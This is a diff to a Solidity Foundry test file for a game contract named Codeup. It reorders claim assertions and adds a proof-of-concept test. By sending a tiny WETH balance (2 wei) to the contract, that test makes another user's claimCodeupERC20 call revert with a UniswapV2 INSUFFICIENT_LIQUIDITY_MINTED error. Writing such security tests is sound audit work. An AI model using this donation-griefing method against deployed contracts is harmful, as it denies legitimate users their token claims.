@@ -116,6 +116,7 @@ contract SomeTest is Test {
             _maxUpgradeAndAssert(user_);
             _claimCodeupERC20AndAssert(user_);
             _claimCodeupERC20AndAssert(user_);
+            _claimCodeupERC20AndAssert(user_); // asserting claiming again reverts
         }
     }
 
@@ -131,6 +132,7 @@ contract SomeTest is Test {
         _changePrank(user1);
         _addGameEthAndAssert(user1, depositValue_);
         _maxUpgradeAndAssert(user1);
+        _claimCodeupERC20AndAssert(user1);
 
         for (uint i = 0; i < 40; i++) {
             _skip(24 minutes);
@@ -139,6 +141,26 @@ contract SomeTest is Test {
         uint256 withdrawnValue_ = _withdrawAndAssert(user1);
         assertEq(withdrawnValue_, 0.0081019008 ether);
         assertGt(withdrawnValue_, depositValue_);
+    }
+
+    function test_POC_INSUFFICIENT_LIQUIDITY_MINTED() public {
+        _skip(101);
+        uint256 depositValue_ = 7865 * gamePrice; // 7865 is the game eth needed to buy all towers
+        assertEq(depositValue_, 0.007865 ether);
+        deal(user1, depositValue_);
+        _changePrank(user1);
+        _addGameEthAndAssert(user1, depositValue_);
+        _maxUpgradeAndAssert(user1);
+        _claimCodeupERC20AndAssert(user1);
+
+        assertEq(depositValue_, 0.007865 ether);
+        deal(user2, depositValue_);
+        _changePrank(user2);
+        _addGameEthAndAssert(user2, depositValue_);
+        _maxUpgradeAndAssert(user2);
+        deal(address(weth), address(codeup), 2);
+        vm.expectRevert("UniswapV2: INSUFFICIENT_LIQUIDITY_MINTED");
+        codeup.claimCodeupERC20(user2);
     }
 
     function _changePrank(address user_) internal {
@@ -294,8 +316,6 @@ contract SomeTest is Test {
             _upgradeTowerAndAssert(user_, i); // asserting that it reverts for 6th builder
         }
         _upgradeTowerAndAssert(user_, 8); // asserting that it reverts for 8th floor
-        _claimCodeupERC20AndAssert(user_);
-        _claimCodeupERC20AndAssert(user_); // asserting claiming again reverts
     }
 
     function _expectedMinIncrease(Codeup.Tower memory tower) internal view returns (uint256 min) {
